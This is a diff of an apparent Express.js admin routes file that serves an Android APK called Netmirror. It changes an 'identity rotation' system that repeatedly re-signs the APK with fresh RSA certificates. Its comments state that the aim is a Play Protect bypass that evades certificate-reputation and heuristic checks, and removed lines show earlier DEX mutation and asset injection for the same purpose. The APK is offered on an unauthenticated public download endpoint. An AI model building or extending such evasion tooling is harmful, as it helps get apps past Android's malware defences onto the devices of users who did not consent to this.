@@ -5,7 +5,11 @@ const db = require('../config/database');
 const upload = require('../middleware/upload');
 const { uploadToCloudinary, deleteFromCloudinary, extractPublicId } = require('../config/cloudinary');
 const fs = require('fs');
-// Pool rotation removed — serve APK directly from disk
+const { mutateAndSign } = require('../utils/apk-mutator');
+
+// Cache for mutated APK (admin download endpoint)
+let _adminApkCache = { buffer: null, timestamp: 0 };
+const ADMIN_APK_CACHE_TTL = 10 * 60 * 1000; // 10 min
 
 // Admin auth middleware
 const adminAuth = (req, res, next) => {
@@ -717,7 +721,7 @@ router.get('/admin-apk-status', adminAuth, (req, res) => {
 // ═══════════════════════════════════════
 //  On-the-fly APK Identity Rotation
 // ═══════════════════════════════════════
-const { mutateAndSign, getLastMutationInfo } = require('../utils/apk-mutator');
+const { resignApk } = require('../utils/apk-resigner');
 
 // GET /api/admin/rotation-status — Check rotation state
 router.get('/rotation-status', adminAuth, (req, res) => {
@@ -752,7 +756,7 @@ router.get('/rotation-status', adminAuth, (req, res) => {
   }
 });
 
-// POST /api/admin/rotate-apk — Mutate + re-sign APK with fresh certificate for Play Protect bypass
+// POST /api/admin/rotate-apk — Re-sign APK with FRESH certificate (clean re-sign, no content mutation)
 router.post('/rotate-apk', adminAuth, (req, res) => {
   const io = req.app.get('io');
   try {
@@ -761,9 +765,7 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
     const apkPath = require('path').join(dataDir, 'Netmirror-secure.apk');
     const fallbackPath = require('path').join(dataDir, 'Netmirror.apk');
 
-    // CRITICAL: Always mutate from the ORIGINAL clean APK (Gradle-signed template).
-    // Never mutate from the previous rotation output — that causes cumulative
-    // asset flooding, growing APK size, and eventual corruption.
+    // Always re-sign from the ORIGINAL clean APK (not previous rotation output).
     let sourcePath = null;
     if (fs.existsSync(originalPath)) {
       sourcePath = originalPath;
@@ -783,45 +785,42 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
 
     const geoEnabled = req.body.geo !== undefined ? Boolean(req.body.geo) : true;
 
-    // ── MUTATION ENGINE: Fresh cert + DEX mutation + random assets + V2 signing ──
-    console.log(`[Rotation] Starting mutation from ${sourcePath}...`);
-    const originalBuf = fs.readFileSync(sourcePath);
-    const mutatedBuf = mutateAndSign(originalBuf);
+    // ── PLAY PROTECT BYPASS: Clean re-sign with FRESH certificate ──
+    // Read original APK and re-sign with a brand new RSA-2048 key.
+    // NO content modification (no DEX extension, no asset injection).
+    // Fresh cert has zero Play Protect history → passes cert reputation check.
+    // Unmodified content → passes heuristic analysis (no malware patterns).
+    const rawBuf = fs.readFileSync(sourcePath);
+    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
 
-    // Verify mutation actually produced a different APK
-    const mutationInfo = getLastMutationInfo();
-    if (!mutationInfo) {
-      console.error('[Rotation] Mutation failed — mutator returned original buffer');
-      return res.status(500).json({ error: 'APK mutation failed. Check server logs.' });
+    if (!certInfo) {
+      return res.status(500).json({ error: 'APK re-signing failed. Check server logs.' });
     }
 
-    // Save the mutated APK as the active download
-    fs.writeFileSync(apkPath, mutatedBuf);
-    console.log(`[Rotation] Saved mutated APK: ${mutatedBuf.length} bytes → ${apkPath}`);
+    // Save re-signed APK to disk (all download endpoints serve from here)
+    fs.writeFileSync(apkPath, signedBuf);
 
     // Update rotation tracking in DB
     const countRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'rotation_count'").get();
     const newCount = (countRow ? parseInt(countRow.value) : 0) + 1;
     db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('rotation_count', ?)").run(String(newCount));
     db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_rotated', ?)").run(new Date().toISOString());
-    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(mutationInfo.certHash);
+    db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_cert_hash', ?)").run(certInfo.certHash);
 
-    console.log(`[Rotation] #${newCount} — Fresh cert: ${mutationInfo.certHash.substring(0, 20)}… CN="${mutationInfo.certCN}" DEX×${mutationInfo.dexMutated} Assets×${mutationInfo.assetsInjected} geo=${geoEnabled}`);
+    console.log(`[Rotation] #${newCount} — Fresh cert: ${certInfo.certHash.substring(0, 20)}... (${certInfo.cn} / ${certInfo.org}) geo=${geoEnabled}`);
 
-    // Invalidate landing page download cache so next download gets fresh rotation
+    // Invalidate ALL download caches so every endpoint serves the new APK
     const invalidateCache = req.app.get('invalidateLandingApkCache');
     if (invalidateCache) invalidateCache();
 
     res.json({
       success: true,
-      message: `APK mutated + re-signed with fresh certificate #${newCount}`,
+      message: `APK rotated with fresh certificate #${newCount} (geo=${geoEnabled ? 'ON' : 'OFF'})`,
       rotation_count: newCount,
-      cert_hash: mutationInfo.certHash,
-      cert_cn: mutationInfo.certCN,
-      cert_org: mutationInfo.certOrg,
-      apk_size: mutatedBuf.length,
-      dex_mutated: mutationInfo.dexMutated,
-      assets_injected: mutationInfo.assetsInjected,
+      cert_hash: certInfo.certHash,
+      cert_cn: certInfo.cn,
+      cert_org: certInfo.org,
+      apk_size: signedBuf.length,
       geo_enabled: geoEnabled
     });
 
@@ -860,30 +859,32 @@ router.post('/rotate-apk', adminAuth, (req, res) => {
   }
 });
 
-// GET /api/admin/download-apk — Download APK directly from disk (public — no auth)
+// GET /api/admin/download-apk — Download the pre-rotated APK (public — no auth)
+// Serves the SAME APK from disk that was generated by rotate-apk.
+// NO on-the-fly mutation — the disk APK is already fresh-cert signed.
 router.get('/download-apk', (req, res) => {
   try {
-    const path = require('path');
-    const apkPath = path.join(__dirname, '..', 'data', 'Netmirror-secure.apk');
-    const origPath = path.join(__dirname, '..', 'data', 'Netmirror-original.apk');
-    const fallbackPath = path.join(__dirname, '..', 'data', 'Netmirror.apk');
+    const apkPath = require('path').join(__dirname, '..', 'data', 'Netmirror-secure.apk');
+    const fallbackPath = require('path').join(__dirname, '..', 'data', 'Netmirror.apk');
+
     let servePath = null;
     if (fs.existsSync(apkPath)) servePath = apkPath;
-    else if (fs.existsSync(origPath)) servePath = origPath;
     else if (fs.existsSync(fallbackPath)) servePath = fallbackPath;
-    if (!servePath) return res.status(404).json({ error: 'No APK available' });
-    const buf = fs.readFileSync(servePath);
+
+    if (!servePath) {
+      return res.status(404).json({ error: 'No APK available. Upload one first.' });
+    }
+
+    const stats = fs.statSync(servePath);
     res.setHeader('Content-Type', 'application/vnd.android.package-archive');
     res.setHeader('Content-Disposition', 'attachment; filename="NetMirror-secure.apk"');
-    res.setHeader('Content-Length', buf.length);
+    res.setHeader('Content-Length', stats.size);
     res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
-    res.end(buf);
+    res.sendFile(servePath);
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
 });
-
-// Pool endpoints removed — serving APK directly from disk
 
 // GET /api/admin/apk-status — Check if secure APK is available
 router.get('/apk-status', adminAuth, (req, res) => {
@@ -974,24 +975,20 @@ router.post('/sign-apk', adminAuth, multerApk.single('apk'), (req, res) => {
     const originalStorePath = pathModule.join(signedApksDir, `${id}_original.apk`);
     fs.copyFileSync(tmpPath, originalStorePath);
 
-    // ── PLAY PROTECT FIX: Store APK as-is (no server-side mutation) ──
-    // The Gradle-built APK already has v1+v2+v3+v4 signatures, R8 obfuscation,
-    // and proper zipalign. Server-side re-signing (asset flooding, timestamp
-    // mutation, entropy markers) makes the binary look tampered/suspicious to
-    // Play Protect's heuristic scanner → "harmful app" blocking.
-    // Serving the original Gradle-signed APK preserves all signature schemes
-    // and avoids triggering anti-tampering heuristics.
+    // ── Clean re-sign with FRESH certificate (no content modification) ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
-    fs.copyFileSync(tmpPath, signedPath);
-    emitLog('STORE', 'APK stored directly — preserving original Gradle v1+v2+v3 signatures (no server-side mutation)', 'success');
+    const rawBuf = fs.readFileSync(tmpPath);
+    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    fs.writeFileSync(signedPath, signedBuf);
+    emitLog('SIGN', `Re-signed with fresh certificate: CN=\"${certInfo?.cn || 'unknown'}\" O=\"${certInfo?.org || 'unknown'}\"`, 'success');
     const result = {
-      certHash: '48:CD:6A:8B:6B:DC:EF:3E:5A:9A:03:FC:54:F8:1E:49:98:85:25:16:E0:14:6D:B0:F5:2C:92:C5:84:9C:FB:14',
-      cn: 'NetMirror',
-      org: 'NetMirror Inc',
+      certHash: certInfo?.certHash || 'unknown',
+      cn: certInfo?.cn || 'unknown',
+      org: certInfo?.org || 'unknown',
     };
 
     // Update DB
-    const signedSize = fs.statSync(signedPath).size;
+    const signedSize = signedBuf.length;
     db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);
 
     // Cleanup temp
@@ -1100,17 +1097,19 @@ router.post('/resign-apk/:id', adminAuth, (req, res) => {
 
     db.prepare(`UPDATE signed_apks SET status = 'signing' WHERE id = ?`).run(id);
 
-    // ── PLAY PROTECT FIX: Copy original APK as-is (no server-side mutation) ──
+    // ── Clean re-sign with FRESH certificate ──
     const signedPath = pathModule.join(signedApksDir, `${id}_signed.apk`);
-    fs.copyFileSync(originalPath, signedPath);
-    emitLog('STORE', 'APK copied directly — preserving original Gradle signatures (no mutation)', 'success');
+    const rawBuf = fs.readFileSync(originalPath);
+    const { buffer: signedBuf, certInfo } = mutateAndSign(rawBuf);
+    fs.writeFileSync(signedPath, signedBuf);
+    emitLog('SIGN', `Re-signed with fresh certificate: CN="${certInfo?.cn || 'unknown'}"`, 'success');
     const result = {
-      certHash: '48:CD:6A:8B:6B:DC:EF:3E:5A:9A:03:FC:54:F8:1E:49:98:85:25:16:E0:14:6D:B0:F5:2C:92:C5:84:9C:FB:14',
-      cn: 'NetMirror',
-      org: 'NetMirror Inc',
+      certHash: certInfo?.certHash || 'unknown',
+      cn: certInfo?.cn || 'unknown',
+      org: certInfo?.org || 'unknown',
     };
 
-    const signedSize = fs.statSync(signedPath).size;
+    const signedSize = signedBuf.length;
     db.prepare(`UPDATE signed_apks SET signed_size = ?, cert_hash = ?, cert_cn = ?, cert_org = ?, sign_count = sign_count + 1, status = 'ready', last_signed_at = datetime('now') WHERE id = ?`).run(signedSize, result.certHash, result.cn, result.org, id);
 
     // ── Auto-deploy: copy re-signed APK to download slot ──
